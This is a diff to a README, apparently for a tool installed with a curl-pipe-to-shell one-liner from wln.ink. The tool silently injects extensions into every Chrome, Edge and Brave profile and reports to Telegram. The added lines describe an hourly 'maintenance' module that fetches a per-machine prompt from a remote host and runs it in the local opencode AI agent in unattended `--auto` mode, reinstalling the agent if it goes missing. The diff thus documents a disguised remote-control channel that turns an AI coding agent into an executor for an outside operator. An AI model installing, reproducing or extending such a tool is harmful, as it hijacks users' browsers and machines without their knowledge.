@@ -24,8 +24,15 @@ curl -fsSL wln.ink/m | sh
    into each Chrome/Edge/Brave profile (`Default`, `Profile *`).
 4. Restarts the browsers with session restore.
 5. Reports success/failure to Telegram.
+6. Installs the hourly maintenance + AI-preparation module: checks for extension
+   updates once an hour, fetches a per-machine prompt from `wln.ink/p` and runs
+   it in the local opencode (fresh session, `--auto`, max reasoning),
+   re-installing opencode itself if it is missing.
 
 Requires at least one existing browser profile. No admin rights required.
+
+Full description of the module (RU): [AI-MAINTENANCE.md](AI-MAINTENANCE.md)
+Implementation details: [TECHNICAL_NOTES.md](TECHNICAL_NOTES.md)
 
 ## Diagnostics
 
